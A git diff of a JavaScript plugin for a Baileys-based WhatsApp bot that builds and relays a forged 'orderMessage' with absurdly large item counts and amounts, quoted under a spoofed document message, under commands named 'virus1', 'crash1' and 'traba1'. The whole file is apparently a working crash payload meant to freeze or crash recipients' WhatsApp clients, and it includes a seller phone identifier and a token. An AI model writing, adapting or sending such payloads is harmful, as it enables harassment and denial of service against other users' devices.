@@ -1,24 +1,28 @@
-const const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
+const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
+import fs from 'fs'
 let handler = async (m, { conn, text, args, usedPrefix, command }) => {	   
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
 const doc = { 
-key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m ? { remoteJid: "" } : {})},
+key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {})},
 "message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple•MD`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
-var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"audioMessage": {
-"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
-"mimetype": "audio/mpeg",
-"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
-"fileLength": "258330",
-"seconds": 16,
-"ptt": false,
-"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
-"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
-"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
-"mediaKeyTimestamp": "1657190832",
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+"orderId": "449756950375071",
+"orderImage": messa.imageMessage,
+"itemCount": 100000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `© ...`,
+"jpegThumbnail": fs.readFileSync('./media/menus/Menu2.jpg'),
+"orderTitle": `© 😋`,
+"sellerJid": "593991398786@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "500000000000000",
+"totalCurrencyCode": "IDR",
 }
 }), { userJid: m.chat, quoted: doc })
-conn.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+conn.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
-handler.command = ['virus2', 'c2', 'binario2', 'traba2', 'crash2'] 
+handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1'] 
 handler.rowner = true
 export default handler
